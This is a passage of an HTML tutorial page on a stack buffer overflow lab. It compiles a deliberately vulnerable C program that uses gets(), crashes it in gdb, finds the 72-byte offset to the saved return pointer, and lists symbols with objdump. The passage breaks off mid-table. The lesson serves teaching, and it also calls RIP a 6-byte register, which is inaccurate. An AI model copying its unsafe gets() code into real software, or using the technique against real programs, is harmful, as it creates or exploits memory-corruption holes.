@@ -1,0 +1,561 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>First buffer overflow attack</title>
+	<link rel="stylesheet" href="style.css" />
+	<script type="text/javascript" src="script.js"></script>
+	<link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@600&family=Quicksand:wght@500&family=Saira+Stencil+One&family=Ubuntu:wght@500;700&display=swap" rel="stylesheet" />
+	<link rel="icon" href="https://vulnx.in/favicon.png" />
+	<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.1/css/all.css" />
+	<script data-ad-client="ca-pub-6203666289882469" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+	<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+	<meta name="HandheldFriendly" content="true" />
+	<meta name="keywords" content="VulnX, vulnx, vulnx.in, VulnX.in, hacking, Hacking, Buffer Overflow, Local variable, local variable, buffer overflow, bof, BoF, exploiting, binary exploiting, memory / corruption, memory, corruption, exploit, stack, overflow the stack, overwrite RIP, overwrite EIP, saved return pointer, remote code execution">
+	<meta charset="utf-8" />
+	<meta name="google-signin-client_id" content="7743864513-tbfn9rfgcgni8c2t8b9obgjpobeq0j7i.apps.googleusercontent.com" />
+	<script src="https://apis.google.com/js/platform.js?onload=renderButton" async defer></script>
+</head>
+<body onload="fillBlank()">
+	<script async src="https://www.googletagmanager.com/gtag/js?id=UA-167461836-1"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+  
+      gtag('config', 'UA-167461836-1');
+    </script>
+
+    <div id="progressBar"></div>
+  
+    <div id="my-signin2"></div>
+  
+    <ul class="topnav"><div class="x">
+      <img id="logo" src="../logo.png" onclick="reveal()" />
+      <div style="display: flex; justify-content: row-reverse; align-items: center;"><li><a target="_blank" href="../">Home</a></li>
+        <li><a target="_blank" href="../Contents/resources.html">Resources</a></li>
+        <li><a target="_blank" href="../Contents/tutorials.html">Tutorials</a></li>
+        <li><a target="_blank" href="../Contents/CTFs.html">CTFs</a></li></div>
+      </div>
+    </ul>
+
+    <div id="pop">
+      <a id="popButton">My account</a><br />
+      <a id="popButton" onclick="signOut()">Log out</a>
+    </div>
+
+    <div id="cookieBar">
+      <div id="cookieText">By using our site, you agree to our use of cookies to deliver a better site experience</div>
+      <div id="cookieButton" onclick="hideCookieBar()"><span></span><span></span><span></span><span></span>&#10005;</div>
+    </div>
+
+    <div id="align">
+    	<center><h1 style="color: #1b1b1b;">Buffer Overflow</h1></center>
+    	<center><h1 style="color: #1b1b1b;">First buffer overflow</h1></center>
+
+    	<p>Hey guys! What's up?</p>
+    	<p>Welcome to the fourth tutorial of the Buffer Overflow series. In the previous tutorial, we understood how the <span style="background-color: #dcdcdc; padding: 0 5px;">assembly : <span style="font-weight: bold;">ret</span></span> instruction works</p> and how if we overflow the stack buffer and overwrite the <i>saved return pointer</i> with an arbitrary address, we can redirect code execution to that address.
+
+    	<h2>Table of Contents :</h2>
+    	<ul>
+    		<li style="margin: 10px 0;"><span style="color: #05f; border-bottom: 1px solid #05f; cursor: pointer; --webkit-tap-highlight-color: transparent" onclick="location.href='#Recap'">Quick recap of the 'ret' instruction</span></li>
+    		<li style="margin: 10px 0;"><span style="color: #05f; border-bottom: 1px solid #05f; cursor: pointer; --webkit-tap-highlight-color: transparent" onclick="location.href='#Checking-for-buffer-overflow'">Checking for buffer overflow vulnerability</span></li>
+    		<li style="margin: 10px 0;"><span style="color: #05f; border-bottom: 1px solid #05f; cursor: pointer; --webkit-tap-highlight-color: transparent" onclick="location.href='#Determining-correct-offset'">Determining the correct offset</span></li>
+    		<li style="margin: 10px 0;"><span style="color: #05f; border-bottom: 1px solid #05f; cursor: pointer; --webkit-tap-highlight-color: transparent" onclick="location.href='#Fetching-the-address-of-callMe()'">Fetching the address of 'callMe()'</span></li>
+    		<li style="margin: 10px 0;"><span style="color: #05f; border-bottom: 1px solid #05f; cursor: pointer; --webkit-tap-highlight-color: transparent" onclick="location.href='#Redirecting-flow-of-control'">Redirecting flow of control.</span></li>
+    	</ul>
+
+    	<span style="position: relative; top: -120px; visibility: hidden;" id="Recap"></span><h2>Recap of 'ret' instruction</h2>
+    	<p>Whenever a function is called, or the <span style="background-color: #dcdcdc; padding: 0 5px;">assembly : <span style="font-weight: bold;">call</span></span> instruction is executed, the memory address of the next instruction to be executed is push on the stack. Then the RIP [ the 64-bit instruction pointer register ] is changed to the base address of the function to be called. The function so called, sets up a new stack frame for itself to allow the storage of local variables and other data. At the end of the function, just before it returns back, the stack frame is destroyed and now, again the RSP points directly to the instruction which was pushed earlier on the stack.</p>
+
+      <p>This way the return address or return pointer is always saved on the stack and it is lies beneath the RBP [ like we had seen <span style="color: #05f; border-bottom: 1px solid #05f; cursor: pointer;" onclick="location.href='Understanding%20the%20concept%20of%20overwriting%20return%20pointer%20to%20acheive%20arbitrary%20code%20execution.html#Stack%20Layout'">here</span> ]. Therefore, if we write data past the base of the stack and correctly overflow the <i>saved return pointer</i>, with the address of an arbitrary function, the flow of control should be redirected there.</p>
+
+      <span id="Checking-for-buffer-overflow" style="position: relative; top: -120px;"></span><h2>Checking for buffer overflow vulnerability</h2>
+      <p>Before we begin, store the code snippet provided below in a file and compile it with the command commented in the script</p>
+
+      <pre><div id="snip"><b><span style="color: #aaa;">//  File name     : controlRIP.c
+//  Compile with  : gcc controlRIP.c -m64 -no-pie -o controlRIP.elf</span>
+
+<font color="#55FFFF">#include</font> <font color="#FF55FF">&lt;stdio.h&gt;</font>
+
+<span style="color: #55FF55;">void</span> callMe() {
+  printf(<span style="color: #FF55FF;">"[+] Boom! Code execution redirected.\n"</span>);
+}
+
+<span style="color: #55FF55;">int</span> func() {
+  <span style="color: #55FF55;">char</span> uname[<span style="color: #FF55FF;">64</span>];
+  printf(<span style="color: #FF55FF;">"Enter your username : "</span>);
+  gets(uname);
+  printf(<span style="color: #FF55FF;">"Sorry Mr. %s, but you failed.\n"</span>, uname);
+}
+
+<font color="#55FF55">int</font> main(<font color="#55FF55">int</font> argc, <font color="#55FF55">char const</font> *argv[]) {
+  func();
+  <font color="#FFFF55">return</font> <font color="#FF55FF">0</font>;
+}</b></div></pre>
+
+      <div id="quote">The flag <span style="color: #000; font-weight: bold">-no-pie</span> disables PIE for the compiled application. This means that the binary will be unaffected by ASLR.</div>
+
+      <p>After compiling, when you feed normal input, it should work just fine</p>
+      <pre>
+        <div id="snip"><span style="font-weight: bold;">root@kali</span>:<span style="color: #8181ff; font-weight: bold">~/Desktop/Buffer Overflow</span># ./controlRIP.elf 
+Enter your username : root
+Sorry Mr. root, but you failed.
+<span style="font-weight: bold;">root@kali</span>:<span style="color: #8181ff; font-weight: bold">~/Desktop/Buffer Overflow</span># </div>
+      </pre>
+
+      <p>But notice when you feed more input than what was expected, you get a seg fault</p>
+      <pre>
+        <div id="snip"><span style="font-weight: bold;">root@kali</span>:<span style="color: #8181ff; font-weight: bold">~/Desktop/Buffer Overflow</span># python3 -c 'print("A" * 100)' | ./controlRIP.elf 
+Enter your username : Sorry Mr. AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA, but you failed.
+Segmentation fault
+<span style="font-weight: bold;">root@kali</span>:<span style="color: #8181ff; font-weight: bold">~/Desktop/Buffer Overflow</span># </div>
+      </pre>
+
+      <p>This clearly means that there is a buffer overflow vulnerability.</p>
+
+      <p>Now let's open up the program in GDB and crash it there</p>
+      <pre>
+        <div id="snip"><span style="font-weight: bold;">root@kali</span>:<span style="color: #8181ff; font-weight: bold">~/Desktop/Buffer Overflow</span># gdb ./controlRIP.elf -q
+Reading symbols from <span style="color: #0f5; font-weight: bold;">./controlRIP.elf</span>...
+(No debugging symbols found in <span style="color: #0f5; font-weight: bold;">./controlRIP.elf</span>)
+gdb-peda$ run
+Starting program: /root/Desktop/Buffer Overflow/controlRIP.elf 
+Enter your username : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Sorry Mr. AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA, but you failed.
+
+Program received signal SIGSEGV, Segmentation fault.
+<span style="color: #8181ff;">[----------------------------------registers-----------------------------------]</span>
+<span style="color: #0f5; font-weight: bold;">RAX</span>: 0x80 
+<span style="color: #0f5; font-weight: bold;">RBX</span>: 0x0 
+<span style="color: #0f5; font-weight: bold;">RCX</span>: 0x0 
+<span style="color: #0f5; font-weight: bold;">RDX</span>: 0x0 
+<span style="color: #0f5; font-weight: bold;">RSI</span>: <span style="color: #8181ff;">0x4052a0</span> ("Sorry Mr. ", 'A' &lt;repeats 100 times>, ", but you failed.\n")
+<span style="color: #0f5; font-weight: bold;">RDI</span>: <span style="color: #8181ff;">0x1555555054c0</span> --> 0x0 
+<span style="color: #0f5; font-weight: bold;">RBP</span>: 0x4141414141414141 ('AAAAAAAA')
+<span style="color: #0f5; font-weight: bold;">RSP</span>: <span style="color: #8181ff;">0x7fffffffdff8</span> ('A' &lt;repeats 28 times>)
+<span style="color: #0f5; font-weight: bold;">RIP</span>: 0x401199 (&lt;func+68>: ret)
+<span style="color: #0f5; font-weight: bold;">R8</span> : 0xffffffff 
+<span style="color: #0f5; font-weight: bold;">R9</span> : 0x80 
+<span style="color: #0f5; font-weight: bold;">R10</span>: <span style="color: #8181ff;">0x7fffffffdfb0</span> ('A' &lt;repeats 100 times>)
+<span style="color: #0f5; font-weight: bold;">R11</span>: 0x246 
+<span style="color: #0f5; font-weight: bold;">R12</span>: 0x401060 (&lt;_start>:  xor    ebp,ebp)
+<span style="color: #0f5; font-weight: bold;">R13</span>: <span style="color: #8181ff;">0x7fffffffe0f0</span> --> 0x1 
+<span style="color: #0f5; font-weight: bold;">R14</span>: 0x0 
+<span style="color: #0f5; font-weight: bold;">R15</span>: 0x0
+<span style="color: #0f5; font-weight: bold;">EFLAGS</span>: 0x10202 (<span style="color: #0f5; font-weight: bold;">carry parity adjust zero sign trap</span> <span style="color: #fff; font-weight: bold;">INTERRUPT</span> <span style="color: #0f5; font-weight: bold;">direction overflow</span>)
+<span style="color: #8181ff;">[-------------------------------------code-------------------------------------]</span>
+   0x401192 &lt;func+61>:  <span style="color: #aaa">call   0x401040 &lt;printf@plt></span>
+   0x401197 &lt;func+66>:  <span style="color: #aaa">nop</span>
+   0x401198 &lt;func+67>:  <span style="color: #aaa">leave  </span>
+=> 0x401199 &lt;func+68>:  <span style="color: #0f5; font-weight: bold;">ret</span>    
+   0x40119a &lt;main>:       push   rbp
+   0x40119b &lt;main+1>:   mov    rbp,rsp
+   0x40119e &lt;main+4>:   sub    rsp,0x10
+   0x4011a2 &lt;main+8>:   mov    DWORD PTR [rbp-0x4],edi
+<span style="color: #8181ff;">[------------------------------------stack-------------------------------------]</span>
+0000| <span style="color: #8181ff;">0x7fffffffdff8</span> ('A' &lt;repeats 28 times>)
+0008| <span style="color: #8181ff;">0x7fffffffe000</span> ('A' &lt;repeats 20 times>)
+0016| <span style="color: #8181ff;">0x7fffffffe008</span> ('A' &lt;repeats 12 times>)
+0024| <span style="color: #8181ff;">0x7fffffffe010</span> --> 0x41414141 ('AAAA')
+0032| <span style="color: #8181ff;">0x7fffffffe018</span> --> 0x15555536ce0b (<__libc_start_main+235>: mov    edi,eax)
+0040| <span style="color: #8181ff;">0x7fffffffe020</span> --> 0x0 
+0048| <span style="color: #8181ff;">0x7fffffffe028</span> --> <span style="color: #8181ff;">0x7fffffffe0f8</span> --> <span style="color: #8181ff;">0x7fffffffe426</span> ("/root/Desktop/Buffer Overflow/controlRIP.elf")
+0056| <span style="color: #8181ff;">0x7fffffffe030</span> --> 0x100040000 
+<span style="color: #8181ff;">[------------------------------------------------------------------------------]</span>
+Legend: <span style="color: #8181ff;">code</span>, <span style="color: #0f5; font-weight: bold;">data</span>, rodata, value
+Stopped reason: SIGSEGV
+<span style="color: #8181ff;">0x0000000000401199</span> in <span style="color: #ff0; font-weight: bold;">func</span> ()
+gdb-peda$ </div>
+      </pre>
+
+      <p>As you can see, the RIP points to the location of the crash. However, the RBP points to 0x4141414141414141 which is hex equivalent of 'AAAAAAAA'. This means that some 8 <span style="background-color: #dcdcdc; padding: 0 5px; font-weight: bold;">A</span> letters will be overwritten in the RBP.</p>
+
+      <p>So now our primary objective will be to determine the exact offset to overwrite the saved return pointer.</p>
+
+      <span id="Determining-correct-offset" style="position: relative; top: -120px;"></span><h2>Determining the correct offset</h2>
+      <p>Since we know that some 8 <span style="background-color: #dcdcdc; padding: 0 5px; font-weight: bold;">A</span>'s are overflowed to the RBP register, we can use a pattern like this :</p>
+      <div id="quote">AAAAAAAABBBBBBBBCCCCCCCC ...</div>
+
+      <p>to overflow the buffer. This way we can examine which 8 bytes overflowed the RBP and accordingly calculate the offset for <span style="font-weight: bold;">Base Pointer</span></p>
+
+      <p>So the entire pattern will be like this :-</p>
+
+      <div id="snip">AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHIIIIIIIIJJJJJJJJKKKKKKKKLLLLLLLLMMMMMMMMNNNNNNNNOOOOOOOOPPPPPPPPQQQQQQQQRRRRRRRRSSSSSSSSTTTTTTTTUUUUUUUUVVVVVVVVWWWWWWWWXXXXXXXXYYYYYYYYZZZZZZZZ</div>
+
+      <p>Now let's quickly feed this data to our binary</p>
+
+      <pre>
+        <div id="snip">gdb-peda$ run
+Starting program: /root/Desktop/Buffer Overflow/controlRIP.elf 
+Enter your username : AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHIIIIIIIIJJJJJJJJKKKKKKKKLLLLLLLLMMMMMMMMNNNNNNNNOOOOOOOOPPPPPPPPQQQQQQQQRRRRRRRRSSSSSSSSTTTTTTTTUUUUUUUUVVVVVVVVWWWWWWWWXXXXXXXXYYYYYYYYZZZZZZZZ
+Sorry Mr. AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHIIIIIIIIJJJJJJJJKKKKKKKKLLLLLLLLMMMMMMMMNNNNNNNNOOOOOOOOPPPPPPPPQQQQQQQQRRRRRRRRSSSSSSSSTTTTTTTTUUUUUUUUVVVVVVVVWWWWWWWWXXXXXXXXYYYYYYYYZZZZZZZZ, but you failed.
+
+Program received signal SIGSEGV, Segmentation fault.
+<span style="color: #8181ff">[----------------------------------registers-----------------------------------]</span>
+<span style="color: #0f5">RAX</span>: 0xec 
+<span style="color: #0f5">RBX</span>: 0x0 
+<span style="color: #0f5">RCX</span>: 0x0 
+<span style="color: #0f5">RDX</span>: 0x0 
+<span style="color: #0f5">RSI</span>: <span style="color: #8181ff">0x4052a0</span> ("Sorry Mr. AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHIIIIIIIIJJJJJJJJKKKKKKKKLLLLLLLLMMMMMMMMNNNNNNNNOOOOOOOOPPPPPPPPQQQQQQQQRRRRRRRRSSSSSSSSTTTTTTTTUUUUUUUUVVVVVVVVWWWWWWWWXXXXXX"...)
+<span style="color: #0f5">RDI</span>: <span style="color: #8181ff">0x7ffff7fae4c0</span> --> 0x0 
+<span style="color: #0f5">RBP</span>: 0x4949494949494949 ('IIIIIIII')
+<span style="color: #0f5">RSP</span>: <span style="color: #8181ff">0x7fffffffdff8</span> ("JJJJJJJJKKKKKKKKLLLLLLLLMMMMMMMMNNNNNNNNOOOOOOOOPPPPPPPPQQQQQQQQRRRRRRRRSSSSSSSSTTTTTTTTUUUUUUUUVVVVVVVVWWWWWWWWXXXXXXXXYYYYYYYYZZZZZZZZ")
+<span style="color: #0f5">RIP</span>: 0x401199 (&lt;func+68>: ret)
+<span style="color: #0f5">R8</span> : 0xffffffff 
+<span style="color: #0f5">R9</span> : 0xec 
+<span style="color: #0f5">R10</span>: <span style="color: #8181ff">0x7fffffffdfb0</span> ("AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHIIIIIIIIJJJJJJJJKKKKKKKKLLLLLLLLMMMMMMMMNNNNNNNNOOOOOOOOPPPPPPPPQQQQQQQQRRRRRRRRSSSSSSSSTTTTTTTTUUUUUUUUVVVVVVVVWWWWWWWWXXXXXXXXYYYYYYYY"...)
+<span style="color: #0f5">R11</span>: 0x246 
+<span style="color: #0f5">R12</span>: 0x401060 (&lt;_start>:  xor    ebp,ebp)
+<span style="color: #0f5">R13</span>: <span style="color: #8181ff">0x7fffffffe0f0</span>  --> 0x1 
+<span style="color: #0f5">R14</span>: 0x0 
+<span style="color: #0f5">R15</span>: 0x0
+<span style="color: #0f5">EFLAGS</span>: 0x10202 (<span style="color: #0f5">carry parity adjust zero sign trap</span> <span style="font-weight: bold">INTERRUPT</span> <span style="color: #0f5">direction overflow</span>)
+<span style="color: #8181ff">[-------------------------------------code-------------------------------------]</span>
+   0x401192 &lt;func+61>:  <span style="color: #aaa">call   0x401040 &lt;printf@plt></span>
+   0x401197 &lt;func+66>:  <span style="color: #aaa">nop</span>
+   0x401198 &lt;func+67>:  <span style="color: #aaa">leave  </span>
+=> 0x401199 &lt;func+68>:  <span style="font-weight: bold; color: #0f5">ret</span>
+   0x40119a &lt;main>:     push   rbp
+   0x40119b &lt;main+1>:   mov    rbp,rsp
+   0x40119e &lt;main+4>:   sub    rsp,0x10
+   0x4011a2 &lt;main+8>:   mov    DWORD PTR [rbp-0x4],edi
+<span style="color: #8181ff">[------------------------------------stack-------------------------------------]</span>
+0000| <span style="color: #8181ff">0x7fffffffdff8</span> ("JJJJJJJJKKKKKKKKLLLLLLLLMMMMMMMMNNNNNNNNOOOOOOOOPPPPPPPPQQQQQQQQRRRRRRRRSSSSSSSSTTTTTTTTUUUUUUUUVVVVVVVVWWWWWWWWXXXXXXXXYYYYYYYYZZZZZZZZ")
+0008| <span style="color: #8181ff">0x7fffffffe000</span> ("KKKKKKKKLLLLLLLLMMMMMMMMNNNNNNNNOOOOOOOOPPPPPPPPQQQQQQQQRRRRRRRRSSSSSSSSTTTTTTTTUUUUUUUUVVVVVVVVWWWWWWWWXXXXXXXXYYYYYYYYZZZZZZZZ")
+0016| <span style="color: #8181ff">0x7fffffffe008</span> ("LLLLLLLLMMMMMMMMNNNNNNNNOOOOOOOOPPPPPPPPQQQQQQQQRRRRRRRRSSSSSSSSTTTTTTTTUUUUUUUUVVVVVVVVWWWWWWWWXXXXXXXXYYYYYYYYZZZZZZZZ")
+0024| <span style="color: #8181ff">0x7fffffffe010</span> ("MMMMMMMMNNNNNNNNOOOOOOOOPPPPPPPPQQQQQQQQRRRRRRRRSSSSSSSSTTTTTTTTUUUUUUUUVVVVVVVVWWWWWWWWXXXXXXXXYYYYYYYYZZZZZZZZ")
+0032| <span style="color: #8181ff">0x7fffffffe018</span> ("NNNNNNNNOOOOOOOOPPPPPPPPQQQQQQQQRRRRRRRRSSSSSSSSTTTTTTTTUUUUUUUUVVVVVVVVWWWWWWWWXXXXXXXXYYYYYYYYZZZZZZZZ")
+0040| <span style="color: #8181ff">0x7fffffffe020</span> ("OOOOOOOOPPPPPPPPQQQQQQQQRRRRRRRRSSSSSSSSTTTTTTTTUUUUUUUUVVVVVVVVWWWWWWWWXXXXXXXXYYYYYYYYZZZZZZZZ")
+0048| <span style="color: #8181ff">0x7fffffffe028</span> ("PPPPPPPPQQQQQQQQRRRRRRRRSSSSSSSSTTTTTTTTUUUUUUUUVVVVVVVVWWWWWWWWXXXXXXXXYYYYYYYYZZZZZZZZ")
+0056| <span style="color: #8181ff">0x7fffffffe030</span> ("QQQQQQQQRRRRRRRRSSSSSSSSTTTTTTTTUUUUUUUUVVVVVVVVWWWWWWWWXXXXXXXXYYYYYYYYZZZZZZZZ")
+<span style="color: #8181ff">[------------------------------------------------------------------------------]</span>
+Legend: code, data, <span style="color: #8181ff">rodata</span>, value
+Stopped reason: SIGSEGV
+<span style="color: #8181ff">0x0000000000401199</span> in <span style="color: #ff0">func</span> ()
+gdb-peda$ </div>
+      </pre>
+
+      <p>As you can see above, the RBP is overwritten with 0x4949494949494949 ('<span style="font-family: 'Fira Code'">IIIIIIII</span>'). This clearly means that from AAA... all the way up to HHHHHHHH will be stored in the buffer and from <span style="font-family: 'Fira Code'">IIIIIIII</span> onwards, the rest of the data will be overflowed. Thus the offset for RBP is the number of bytes of the text :</p>
+      <div id="quote">AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHH</div>
+
+      <p>Since 'H' is the 8th alphabet and every alphabet is repeated 8 times thus the offset is :</p>
+      <ul>
+        alphabetical position x character frequency<br />
+        <span style="font-family: 'Fira Code'">==></span> 8 x 8<br />
+        <span style="font-family: 'Fira Code'">==></span> <div style="margin: 5px;"><span style="border: 2px solid #555a; padding: 5px">64</span></div>
+      </ul>
+
+      <p>Thus the offset for the RBP is 64. The <i>saved return pointer</i>, lies just beneath the base-pointer, thus the correct offset for the <i>saved return pointer</i> should be 64 + 8 [ since registers in a x64 system are of 8 bytes ].</p>
+
+      <p>This gives us the correct offset for the <i>saved return pointer</i> as 72. Let's test it before proceeding further. We will write 72 times the letter <span style="background-color: #dcdcdc; padding: 0 5px; font-weight: bold;">A</span> and 6 times the letter <span style="background-color: #dcdcdc; padding: 0 5px; font-weight: bold;">B</span></p>
+
+      <div id="quote" style="text-transform: uppercase; font-weight: bold; color: #333;">Note : The letter 'B' is repeated 6 times and not 8 because the RIP is a 6 byte register. Try to write more than 6 bytes in it and see what happens.</div>
+
+      <span id="Fetching-the-address-of-callMe()" style="position: relative; top: -120px;"></span><h2>Fetching the addressing of 'callMe()'</h2>
+      <p>Alright, now we need to find the exact address where <abbr title="Our AIM : The function to be called">'callMe()' </abbr> is located. We can do that by using <i>objdump</i> with our binary.</p>
+      <pre>
+        <div id="snip"><b>root@kali</b>:<span style="color: #8181ff; font-weight: bold">~/Desktop/Buffer Overflow</span># objdump --help
+Usage: objdump &lt;option(s)> &lt;file(s)>
+ Display information from object &lt;file(s)>.
+ At least one of the following switches must be given:
+  -a, --archive-headers    Display archive header information
+  -f, --file-headers       Display the contents of the overall file header
+  -p, --private-headers    Display object format specific file header contents
+  -P, --private=OPT,OPT... Display object format specific contents
+  -h, --[section-]headers  Display the contents of the section headers
+  -x, --all-headers        Display the contents of all headers
+  -d, --disassemble        Display assembler contents of executable sections
+  -D, --disassemble-all    Display assembler contents of all sections
+      --disassemble=&lt;sym>  Display assembler contents from &lt;sym>
+  -S, --source             Intermix source code with disassembly
+      --source-comment[=&lt;txt>] Prefix lines of source code with &lt;txt>
+  -s, --full-contents      Display the full contents of all sections requested
+  -g, --debugging          Display debug information in object file
+  -e, --debugging-tags     Display debug information using ctags style
+  -G, --stabs              Display (in raw form) any STABS info in the file
+  -W[lLiaprmfFsoRtUuTgAckK] or
+  --dwarf[=rawline,=decodedline,=info,=abbrev,=pubnames,=aranges,=macro,=frames,
+          =frames-interp,=str,=loc,=Ranges,=pubtypes,
+          =gdb_index,=trace_info,=trace_abbrev,=trace_aranges,
+          =addr,=cu_index,=links,=follow-links]
+                           Display DWARF info in the file
+  --ctf=SECTION            Display CTF info from SECTION
+  <span style="color: #333; background: #ff0; font-weight: bold">-t, --syms               Display the contents of the symbol table(s)</span>
+  -T, --dynamic-syms       Display the contents of the dynamic symbol table
+  -r, --reloc              Display the relocation entries in the file
+  -R, --dynamic-reloc      Display the dynamic relocation entries in the file
+  @&lt;file>                  Read options from &lt;file>
+  -v, --version            Display this program's version number
+  -i, --info               List object formats and architectures supported
+  -H, --help               Display this information
+
+ The following switches are optional:
+  -b, --target=BFDNAME           Specify the target object format as BFDNAME
+  -m, --architecture=MACHINE     Specify the target architecture as MACHINE
+  -j, --section=NAME             Only display information for section NAME
+  -M, --disassembler-options=OPT Pass text OPT on to the disassembler
+  -EB --endian=big               Assume big endian format when disassembling
+  -EL --endian=little            Assume little endian format when disassembling
+      --file-start-context       Include context from start of file (with -S)
+  -I, --include=DIR              Add DIR to search list for source files
+  -l, --line-numbers             Include line numbers and filenames in output
+  -F, --file-offsets             Include file offsets when displaying information
+  -C, --demangle[=STYLE]         Decode mangled/processed symbol names
+                                  The STYLE, if specified, can be `auto', `gnu',
+                                  `lucid', `arm', `hp', `edg', `gnu-v3', `java'
+                                  or `gnat'
+      --recurse-limit            Enable a limit on recursion whilst demangling.  [Default]
+      --no-recurse-limit         Disable a limit on recursion whilst demangling
+  -w, --wide                     Format output for more than 80 columns
+  -z, --disassemble-zeroes       Do not skip blocks of zeroes when disassembling
+      --start-address=ADDR       Only process data whose address is >= ADDR
+      --stop-address=ADDR        Only process data whose address is &lt; ADDR
+      --prefix-addresses         Print complete address alongside disassembly
+      --[no-]show-raw-insn       Display hex alongside symbolic disassembly
+      --insn-width=WIDTH         Display WIDTH bytes on a single line for -d
+      --adjust-vma=OFFSET        Add OFFSET to all displayed section addresses
+      --special-syms             Include special symbols in symbol dumps
+      --inlines                  Print all inlines for source line (with -l)
+      --prefix=PREFIX            Add PREFIX to absolute paths for -S
+      --prefix-strip=LEVEL       Strip initial directory names for -S
+      --dwarf-depth=N        Do not display DIEs at depth N or greater
+      --dwarf-start=N        Display DIEs starting with N, at the same depth
+                             or deeper
+      --dwarf-check          Make additional dwarf internal consistency checks.      
+      --ctf-parent=SECTION       Use SECTION as the CTF parent
+      --visualize-jumps          Visualize jumps by drawing ASCII art lines
+      --visualize-jumps=color    Use colors in the ASCII art
+      --visualize-jumps=extended-color   Use extended 8-bit color codes
+      --visualize-jumps=off      Disable jump visualization
+
+objdump: supported targets: elf64-x86-64 elf32-i386 elf32-iamcu elf32-x86-64 pei-i386 pei-x86-64 elf64-l1om elf64-k1om elf64-little elf64-big elf32-little elf32-big pe-x86-64 pe-bigobj-x86-64 pe-i386 srec symbolsrec verilog tekhex binary ihex plugin
+objdump: supported architectures: i386 i386:x86-64 i386:x64-32 i8086 i386:intel i386:x86-64:intel i386:x64-32:intel i386:nacl i386:x86-64:nacl i386:x64-32:nacl iamcu iamcu:intel l1om l1om:intel k1om k1om:intel
+
+The following i386/x86-64 specific disassembler options are supported for use
+with the -M switch (multiple options should be separated by commas):
+  x86-64      Disassemble in 64bit mode
+  i386        Disassemble in 32bit mode
+  i8086       Disassemble in 16bit mode
+  att         Display instruction in AT&T syntax
+  intel       Display instruction in Intel syntax
+  att-mnemonic
+              Display instruction in AT&T mnemonic
+  intel-mnemonic
+              Display instruction in Intel mnemonic
+  addr64      Assume 64bit address size
+  addr32      Assume 32bit address size
+  addr16      Assume 16bit address size
+  data32      Assume 32bit data size
+  data16      Assume 16bit data size
+  suffix      Always display instruction suffix in AT&T syntax
+  amd64       Display instruction in AMD64 ISA
+  intel64     Display instruction in Intel64 ISA
+Report bugs to &lt;http://www.sourceware.org/bugzilla/>.
+</div>
+      </pre>
+
+      <p>As you can see above, the highlighted line is what we are looking for. We must print the symbols in order to get the location of the callMe() function.</p>
+      
+      <pre>
+        <div id="snip"><b>root@kali</b>:<span style="color: #8181ff; font-weight: bold">~/Desktop/Buffer Overflow</span># objdump -t controlRIP.elf 
+
+controlRIP.elf:     file format elf64-x86-64
+
+SYMBOL TABLE:
+00000000004002a8 l    d  .interp            0000000000000000              .interp
+00000000004002c4 l    d  .note.gnu.build-id 0000000000000000              .note.gnu.build-id
+00000000004002e8 l    d  .note.ABI-tag      0000000000000000              .note.ABI-tag
+0000000000400308 l    d  .gnu.hash          0000000000000000              .gnu.hash
+0000000000400328 l    d  .dynsym            0000000000000000              .dynsym
+00000000004003b8 l    d  .dynstr            0000000000000000              .dynstr
+0000000000400402 l    d  .gnu.version       0000000000000000              .gnu.version
+0000000000400410 l    d  .gnu.version_r     0000000000000000              .gnu.version_r
+0000000000400430 l    d  .rela.dyn          0000000000000000              .rela.dyn
+0000000000400460 l    d  .rela.plt          0000000000000000              .rela.plt
+0000000000401000 l    d  .init              0000000000000000              .init
+0000000000401020 l    d  .plt               0000000000000000              .plt
+0000000000401060 l    d  .text              0000000000000000              .text
+0000000000401224 l    d  .fini              0000000000000000              .fini
+0000000000402000 l    d  .rodata            0000000000000000              .rodata
+0000000000402068 l    d  .eh_frame_hdr      0000000000000000              .eh_frame_hdr
+00000000004020b8 l    d  .eh_frame          0000000000000000              .eh_frame
+0000000000403e10 l    d  .init_array        0000000000000000              .init_array
+0000000000403e18 l    d  .fini_array        0000000000000000              .fini_array
+0000000000403e20 l    d  .dynamic           0000000000000000              .dynamic
+0000000000403ff0 l    d  .got               0000000000000000              .got
+0000000000404000 l    d  .got.plt           0000000000000000              .got.plt
+0000000000404030 l    d  .data              0000000000000000              .data
+0000000000404040 l    d  .bss               0000000000000000              .bss
+0000000000000000 l    d  .comment           0000000000000000              .comment
+0000000000000000 l    df *ABS*              0000000000000000              crtstuff.c
+00000000004010a0 l     F .text              0000000000000000              deregister_tm_clones
+00000000004010d0 l     F .text              0000000000000000              register_tm_clones
+0000000000401110 l     F .text              0000000000000000              __do_global_dtors_aux
+0000000000404040 l     O .bss               0000000000000001              completed.7452
+0000000000403e18 l     O .fini_array        0000000000000000              __do_global_dtors_aux_fini_array_entry
